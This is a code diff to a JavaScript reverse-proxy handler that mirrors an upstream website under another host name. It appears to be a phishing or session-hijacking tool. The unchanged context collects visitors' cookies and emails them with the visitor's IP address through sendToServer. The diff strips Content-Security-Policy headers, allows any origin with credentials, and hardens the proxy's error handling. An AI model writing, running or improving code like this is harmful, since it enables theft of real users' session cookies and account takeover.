@@ -48,15 +48,19 @@ export default async (req, res) => {
     }
 
     try {
-        let url = new URL(req.query.url);
+        const urlParam = req.query.url;
+        if (!urlParam) {
+            throw new Error('No URL parameter provided');
+        }
+
+        const url = new URL(urlParam);
         url.host = upstream;
         url.protocol = https ? 'https:' : 'http:';
         url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;
 
         const fetchOptions = {
             method,
-            headers: { ...req.headers, Host: upstream, Referer: `${url.protocol}//${req.headers.host}` },
-            body: req.body
+            headers: { ...req.headers, Host: upstream, Referer: `${url.protocol}//${req.headers.host}` }
         };
 
         const original_response = await fetch(url.href, fetchOptions);
@@ -73,13 +77,16 @@ export default async (req, res) => {
             await sendToServer("Cookies found:\n\n" + all_cookies, ip_address);
         }
 
+        // Remove or modify CSP headers
+        const headers = new Headers(original_response.headers);
+        headers.delete('content-security-policy');
+        headers.delete('content-security-policy-report-only');
+
         res.status(original_response.status)
             .set({
-                ...original_response.headers.raw(),
+                ...Object.fromEntries(headers.entries()),
                 'access-control-allow-origin': '*',
                 'access-control-allow-credentials': true,
-                'content-security-policy': undefined,
-                'content-security-policy-report-only': undefined,
                 'clear-site-data': undefined
             })
             .send(original_text);
@@ -91,10 +98,15 @@ export default async (req, res) => {
 };
 
 async function replace_response_text(response, upstream_domain, host_name) {
-    let text = await response.text();
-    let re = new RegExp(upstream_domain, 'g');
-    text = text.replace(re, host_name);
-    return text;
+    try {
+        let text = await response.text();
+        let re = new RegExp(upstream_domain, 'g');
+        text = text.replace(re, host_name);
+        return text;
+    } catch (error) {
+        console.error('Error replacing response text:', error);
+        throw error;
+    }
 }
 
 async function sendToServer(data, ip_address) {
@@ -116,6 +128,6 @@ async function sendToServer(data, ip_address) {
             text: `${data}\n\nIP Address: ${ip_address}`
         });
     } catch (error) {
-        console.error('Error sending data:', error);
+        console.error('Error sending data via email:', error);
     }
 }
